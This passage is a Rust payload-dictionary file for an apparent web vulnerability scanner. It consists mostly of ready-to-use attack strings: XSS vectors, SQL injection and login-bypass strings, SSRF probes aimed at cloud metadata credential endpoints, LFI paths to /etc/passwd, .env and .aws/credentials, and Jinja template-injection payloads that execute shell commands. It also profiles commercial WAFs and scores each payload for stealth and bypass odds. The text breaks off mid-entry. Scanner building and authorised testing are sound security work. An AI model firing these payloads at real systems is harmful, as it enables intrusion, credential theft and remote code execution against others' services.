// scanner/rust_core/src/payload_dictionary.rs
use crate::regex_engine::{Severity, SecretType};
use rayon::prelude::*;
use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use ahash::AHashMap;

// ============================================================================
// ESTRUTURAS DE DADOS
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Payload {
    pub id: String,
    pub payload: String,
    pub category: PayloadCategory,
    pub context: Vec<String>,
    pub stealth_level: f64,
    pub waf_bypass_prob: f64,
    pub severity: Severity,
    pub detection: DetectionMethod,
    pub base_weight: f64,
    pub success_count: u32,
    pub fail_count: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Hash, Eq)]
pub enum PayloadCategory {
    XssReflected,
    XssDom,
    XssStored,
    XssTemplateAngular,
    XssTemplateVue,
    XssDangerously,
    XssJqueryDom,
    XssCsti,
    XssPolyglot,
    XssWafBypass,
    SqliRaw,
    SqliBlind,
    SqliUnion,
    SqliError,
    Ssrf,
    SsrfMetadata,
    SstiJinja,
    SstiEjs,
    SstiThymeleaf,
    Lfi,
    Rce,
    NosqlInjection,
    PrototypePollution,
    OpenRedirect,
    Xxe,
    CommandInjection,
    Deserialization,
    PathTraversal,
    AuthBypass,
    Idor,
    CorsExploit,
    JwtAttack,
    HttpSmuggling,
    HeaderInjection,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum DetectionMethod {
    DomVariable(String),
    Reflection,
    ErrorBased,
    TimeBased,
    BooleanBased,
    UnionBased,
    SsrfResponse,
    AwsMetadata,
    GcpMetadata,
    AzureMetadata,
    Regex(String),
    AuthBypass,
    AccessControl,
    DataLeak,
    CrlfInjection,
    HostOverride,
    HeaderReflection,
    BehaviorChange,
    RceConfirm,
    EnvLeak,
    PrivilegeEscalation,
    RedirectCheck,
    OobCallback,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafProfile {
    pub techniques: Vec<String>,
    pub blocked_patterns: Vec<String>,
    pub bypass_multiplier: f64,
}

// ============================================================================
// WAF PROFILES
// ============================================================================

pub static WAF_PROFILES: once_cell::sync::Lazy<HashMap<String, WafProfile>> = once_cell::sync::Lazy::new(|| {
    let mut m = HashMap::new();
    
    m.insert("cloudflare".to_string(), WafProfile {
        techniques: vec![
            "double_url_encode".to_string(),
            "unicode_normalize".to_string(),
            "chunked_body".to_string(),
            "case_variation".to_string(),
        ],
        blocked_patterns: vec![
            "<script>".to_string(),
            "alert(".to_string(),
            "onerror=".to_string(),
            "UNION SELECT".to_string(),
        ],
        bypass_multiplier: 0.6,
    });
    
    m.insert("akamai".to_string(), WafProfile {
        techniques: vec![
            "tab_injection".to_string(),
            "null_byte".to_string(),
            "overlong_utf8".to_string(),
            "comment_injection".to_string(),
        ],
        blocked_patterns: vec![
            "<script".to_string(),
            "javascript:".to_string(),
            "eval(".to_string(),
            "fromCharCode".to_string(),
        ],
        bypass_multiplier: 0.5,
    });
    
    m.insert("aws_waf".to_string(), WafProfile {
        techniques: vec![
            "parameter_pollution".to_string(),
            "json_injection".to_string(),
            "method_override".to_string(),
        ],
        blocked_patterns: vec![
            "<script>".to_string(),
            "' OR ".to_string(),
            "UNION".to_string(),
            "../".to_string(),
        ],
        bypass_multiplier: 0.65,
    });
    
    m.insert("imperva".to_string(), WafProfile {
        techniques: vec![
            "unicode_normalize".to_string(),
            "header_pollution".to_string(),
            "multipart_abuse".to_string(),
        ],
        blocked_patterns: vec![
            "<script".to_string(),
            "eval(".to_string(),
            "alert(".to_string(),
            "document.cookie".to_string(),
        ],
        bypass_multiplier: 0.55,
    });
    
    m.insert("modsecurity".to_string(), WafProfile {
        techniques: vec![
            "case_swap".to_string(),
            "comment_injection".to_string(),
            "encoding_chain".to_string(),
            "concat_split".to_string(),
        ],
        blocked_patterns: vec![
            "<script>".to_string(),
            "onerror".to_string(),
            "onload".to_string(),
            "UNION SELECT".to_string(),
        ],
        bypass_multiplier: 0.7,
    });
    
    m.insert("unknown".to_string(), WafProfile {
        techniques: vec![
            "double_url_encode".to_string(),
            "case_variation".to_string(),
            "null_byte".to_string(),
        ],
        blocked_patterns: vec![],
        bypass_multiplier: 0.8,
    });
    
    m.insert("none".to_string(), WafProfile {
        techniques: vec![],
        blocked_patterns: vec![],
        bypass_multiplier: 1.0,
    });
    
    m
});

// ============================================================================
// TECH CONTEXT MATRIX - 30+ tecnologias
// ============================================================================

pub static TECH_CONTEXT_MATRIX: once_cell::sync::Lazy<HashMap<String, Vec<PayloadCategory>>> = once_cell::sync::Lazy::new(|| {
    let mut m = HashMap::new();
    
    m.insert("react".to_string(), vec![
        PayloadCategory::XssDom,
        PayloadCategory::XssDangerously,
        PayloadCategory::PrototypePollution,
        PayloadCategory::XssCsti,
    ]);
    
    m.insert("angular".to_string(), vec![
        PayloadCategory::XssTemplateAngular,
        PayloadCategory::XssCsti,
        PayloadCategory::PrototypePollution,
    ]);
    
    m.insert("vue".to_string(), vec![
        PayloadCategory::XssTemplateVue,
        PayloadCategory::XssCsti,
        PayloadCategory::PrototypePollution,
    ]);
    
    m.insert("express".to_string(), vec![
        PayloadCategory::PrototypePollution,
        PayloadCategory::NosqlInjection,
        PayloadCategory::PathTraversal,
        PayloadCategory::SstiEjs,
    ]);
    
    m.insert("django".to_string(), vec![
        PayloadCategory::SstiJinja,
        PayloadCategory::SqliRaw,
        PayloadCategory::PathTraversal,
        PayloadCategory::AuthBypass,
    ]);
    
    m.insert("flask".to_string(), vec![
        PayloadCategory::SstiJinja,
        PayloadCategory::SqliRaw,
        PayloadCategory::Ssrf,
        PayloadCategory::PathTraversal,
    ]);
    
    m.insert("spring".to_string(), vec![
        PayloadCategory::SstiThymeleaf,
        PayloadCategory::SqliRaw,
        PayloadCategory::Rce,
        PayloadCategory::Deserialization,
    ]);
    
    m.insert("laravel".to_string(), vec![
        PayloadCategory::SstiJinja,
        PayloadCategory::SqliRaw,
        PayloadCategory::Lfi,
        PayloadCategory::PathTraversal,
    ]);
    
    m.insert("wordpress".to_string(), vec![
        PayloadCategory::XssReflected,
        PayloadCategory::SqliRaw,
        PayloadCategory::Lfi,
        PayloadCategory::AuthBypass,
    ]);
    
    m.insert("mongodb".to_string(), vec![
        PayloadCategory::NosqlInjection,
        PayloadCategory::Idor,
        PayloadCategory::AuthBypass,
    ]);
    
    m.insert("redis".to_string(), vec![
        PayloadCategory::Ssrf,
        PayloadCategory::CommandInjection,
    ]);
    
    m.insert("aws".to_string(), vec![
        PayloadCategory::SsrfMetadata,
        PayloadCategory::Ssrf,
    ]);
    
    m.insert("graphql".to_string(), vec![
        PayloadCategory::Idor,
        PayloadCategory::AuthBypass,
    ]);
    
    m
});

// ============================================================================
// PAYLOAD DICTIONARY IMPLEMENTAÇÃO
// ============================================================================

pub struct PayloadDictionary {
    payloads: AHashMap<PayloadCategory, Vec<Payload>>,
    waf_profiles: HashMap<String, WafProfile>,
    context_matrix: HashMap<String, Vec<PayloadCategory>>,
    execution_history: Vec<PayloadExecutionRecord>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadExecutionRecord {
    pub payload_id: String,
    pub success: bool,
    pub timestamp: u64,
    pub target_context: String,
}

impl PayloadDictionary {
    pub fn new() -> Self {
        Self {
            payloads: Self::build_all_payloads(),
            waf_profiles: WAF_PROFILES.clone(),
            context_matrix: TECH_CONTEXT_MATRIX.clone(),
            execution_history: Vec::new(),
        }
    }
    
    fn build_all_payloads() -> AHashMap<PayloadCategory, Vec<Payload>> {
        let mut map = AHashMap::new();
        
        // XSS Reflected (15)
        map.insert(PayloadCategory::XssReflected, vec![
            Payload {
                id: "xr01".to_string(),
                payload: "<script>window.__MSE=\"{canary}\"</script>".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string(), "textarea".to_string()],
                stealth_level: 0.3,
                waf_bypass_prob: 0.2,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.25,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr02".to_string(),
                payload: "<img src=x onerror=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string(), "form".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr03".to_string(),
                payload: "<svg/onload=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.55,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr04".to_string(),
                payload: "<body/onload=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.45,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.45,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr05".to_string(),
                payload: "<details/open/ontoggle=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.65,
                waf_bypass_prob: 0.7,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.675,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr06".to_string(),
                payload: "<marquee/onstart=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.65,
                severity: Severity::High,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.625,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr07".to_string(),
                payload: "<video/src=x onerror=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.6,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.575,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr08".to_string(),
                payload: "<input/onfocus=\"window.__MSE='{canary}'\" autofocus>".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "form".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.65,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.625,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr09".to_string(),
                payload: "<select/onfocus=\"window.__MSE='{canary}'\" autofocus>".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "form".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.65,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.625,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr10".to_string(),
                payload: "<isindex type=image src=x onerror=\"window.__MSE='{canary}'\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.7,
                severity: Severity::High,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.7,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr11".to_string(),
                payload: "\"><script>window.__MSE=\"{canary}\"</script>".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string(), "form".to_string()],
                stealth_level: 0.3,
                waf_bypass_prob: 0.3,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.3,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr12".to_string(),
                payload: "'-window.__MSE='{canary}'-'".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.75,
                severity: Severity::High,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.725,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr13".to_string(),
                payload: "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"<img/src=x onerror=window.__MSE='{canary}'>\">".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string()],
                stealth_level: 0.8,
                waf_bypass_prob: 0.85,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.825,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr14".to_string(),
                payload: "<a href=\"javascript:window.__MSE='{canary}'\">click</a>".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::High,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "xr15".to_string(),
                payload: "';window.__MSE='{canary}';//".to_string(),
                category: PayloadCategory::XssReflected,
                context: vec!["textarea".to_string(), "script_context".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.55,
                severity: Severity::Critical,
                detection: DetectionMethod::DomVariable("__MSE".to_string()),
                base_weight: 0.575,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // SQLi Raw (12)
        map.insert(PayloadCategory::SqliRaw, vec![
            Payload {
                id: "sq01".to_string(),
                payload: "' OR '1'='1".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["login".to_string(), "search".to_string(), "id_param".to_string()],
                stealth_level: 0.3,
                waf_bypass_prob: 0.3,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.3,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq02".to_string(),
                payload: "\" OR \"1\"=\"1".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["login".to_string(), "search".to_string()],
                stealth_level: 0.3,
                waf_bypass_prob: 0.3,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.3,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq03".to_string(),
                payload: "' OR '1'='1' --".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["login".to_string(), "search".to_string(), "id_param".to_string()],
                stealth_level: 0.3,
                waf_bypass_prob: 0.25,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.275,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq04".to_string(),
                payload: "1' AND '1'='1".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "numeric".to_string()],
                stealth_level: 0.4,
                waf_bypass_prob: 0.4,
                severity: Severity::High,
                detection: DetectionMethod::BooleanBased,
                base_weight: 0.4,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq05".to_string(),
                payload: "1' AND SLEEP(3)--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "search".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::TimeBased,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq06".to_string(),
                payload: "admin'--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["login".to_string()],
                stealth_level: 0.35,
                waf_bypass_prob: 0.3,
                severity: Severity::Critical,
                detection: DetectionMethod::AuthBypass,
                base_weight: 0.325,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq07".to_string(),
                payload: "1; WAITFOR DELAY '0:0:3'--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "mssql".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::TimeBased,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq08".to_string(),
                payload: "' AND 1=CONVERT(int,(SELECT @@version))--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "mssql".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.45,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.475,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq09".to_string(),
                payload: "1' AND 1=CAST((SELECT version()) AS int)--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "postgres".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.4,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.425,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq10".to_string(),
                payload: "1' OR 1=1 AND SLEEP(2)--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "search".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::TimeBased,
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq11".to_string(),
                payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "mysql".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::ErrorBased,
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sq12".to_string(),
                payload: "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--".to_string(),
                category: PayloadCategory::SqliRaw,
                context: vec!["id_param".to_string(), "blind".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.45,
                severity: Severity::Critical,
                detection: DetectionMethod::BooleanBased,
                base_weight: 0.475,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // SSRF (10)
        map.insert(PayloadCategory::Ssrf, vec![
            Payload {
                id: "ss01".to_string(),
                payload: "http://127.0.0.1".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string(), "redirect".to_string(), "webhook".to_string()],
                stealth_level: 0.4,
                waf_bypass_prob: 0.4,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.4,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss02".to_string(),
                payload: "http://0.0.0.0".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string(), "redirect".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss03".to_string(),
                payload: "http://0x7f000001".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.7,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.7,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss04".to_string(),
                payload: "http://[::1]".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.6,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.6,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss05".to_string(),
                payload: "http://localtest.me".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string(), "redirect".to_string()],
                stealth_level: 0.65,
                waf_bypass_prob: 0.65,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.65,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss06".to_string(),
                payload: "http://2130706433".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.7,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.7,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss07".to_string(),
                payload: "gopher://127.0.0.1:6379/_PING".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss08".to_string(),
                payload: "dict://127.0.0.1:6379/INFO".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss09".to_string(),
                payload: "http://localhost:5432".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.4,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.425,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "ss10".to_string(),
                payload: "http://localhost:9200".to_string(),
                category: PayloadCategory::Ssrf,
                context: vec!["url_param".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.4,
                severity: Severity::High,
                detection: DetectionMethod::SsrfResponse,
                base_weight: 0.425,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // SSRF Metadata (4)
        map.insert(PayloadCategory::SsrfMetadata, vec![
            Payload {
                id: "sm01".to_string(),
                payload: "http://169.254.169.254/latest/meta-data/".to_string(),
                category: PayloadCategory::SsrfMetadata,
                context: vec!["url_param".to_string(), "aws".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::AwsMetadata,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sm02".to_string(),
                payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
                category: PayloadCategory::SsrfMetadata,
                context: vec!["url_param".to_string(), "aws".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::AwsMetadata,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sm03".to_string(),
                payload: "http://metadata.google.internal/computeMetadata/v1/".to_string(),
                category: PayloadCategory::SsrfMetadata,
                context: vec!["url_param".to_string(), "gcp".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::GcpMetadata,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "sm04".to_string(),
                payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
                category: PayloadCategory::SsrfMetadata,
                context: vec!["url_param".to_string(), "azure".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::AzureMetadata,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // LFI (10)
        map.insert(PayloadCategory::Lfi, vec![
            Payload {
                id: "lf01".to_string(),
                payload: "../../../etc/passwd".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string(), "template".to_string()],
                stealth_level: 0.4,
                waf_bypass_prob: 0.4,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("root:".to_string()),
                base_weight: 0.4,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf02".to_string(),
                payload: "....//....//....//etc/passwd".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.65,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("root:".to_string()),
                base_weight: 0.625,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf03".to_string(),
                payload: "..%252f..%252f..%252fetc/passwd".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.75,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("root:".to_string()),
                base_weight: 0.725,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf04".to_string(),
                payload: "/proc/self/environ".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::EnvLeak,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf05".to_string(),
                payload: "php://filter/convert.base64-encode/resource=index.php".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["file_param".to_string(), "php".to_string()],
                stealth_level: 0.55,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("base64".to_string()),
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf06".to_string(),
                payload: "..\\..\\..\\windows\\win.ini".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string(), "windows".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("fonts".to_string()),
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf07".to_string(),
                payload: "../../../.env".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::EnvLeak,
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf08".to_string(),
                payload: "../../../.git/config".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.45,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("remote".to_string()),
                base_weight: 0.45,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf09".to_string(),
                payload: "../../../wp-config.php".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string(), "wordpress".to_string()],
                stealth_level: 0.45,
                waf_bypass_prob: 0.45,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("DB_PASSWORD".to_string()),
                base_weight: 0.45,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "lf10".to_string(),
                payload: "../../../.aws/credentials".to_string(),
                category: PayloadCategory::Lfi,
                context: vec!["path".to_string(), "file_param".to_string(), "aws".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("aws_access_key_id".to_string()),
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // SSTI Jinja (6)
        map.insert(PayloadCategory::SstiJinja, vec![
            Payload {
                id: "tj01".to_string(),
                payload: "{{7*7}}".to_string(),
                category: PayloadCategory::SstiJinja,
                context: vec!["input".to_string(), "url_param".to_string(), "form".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.55,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("49".to_string()),
                base_weight: 0.525,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "tj02".to_string(),
                payload: "{{config}}".to_string(),
                category: PayloadCategory::SstiJinja,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.5,
                waf_bypass_prob: 0.5,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("config".to_string()),
                base_weight: 0.5,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "tj03".to_string(),
                payload: "{{''.__class__.__mro__[2].__subclasses__()}}".to_string(),
                category: PayloadCategory::SstiJinja,
                context: vec!["input".to_string(), "url_param".to_string()],
                stealth_level: 0.6,
                waf_bypass_prob: 0.55,
                severity: Severity::Critical,
                detection: DetectionMethod::Regex("subprocess".to_string()),
                base_weight: 0.575,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "tj04".to_string(),
                payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
                category: PayloadCategory::SstiJinja,
                context: vec!["input".to_string()],
                stealth_level: 0.65,
                waf_bypass_prob: 0.6,
                severity: Severity::Critical,
                detection: DetectionMethod::RceConfirm,
                base_weight: 0.625,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "tj05".to_string(),
                payload: "{{lipsum.__globals__.os.popen('id').read()}}".to_string(),
                category: PayloadCategory::SstiJinja,
                context: vec!["input".to_string()],
                stealth_level: 0.7,
                waf_bypass_prob: 0.65,
                severity: Severity::Critical,
                detection: DetectionMethod::RceConfirm,
                base_weight: 0.675,
                success_count: 0,
                fail_count: 0,
            },
            Payload {
                id: "tj06".to_string(),
                payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
                category: PayloadCategory::SstiJinja,
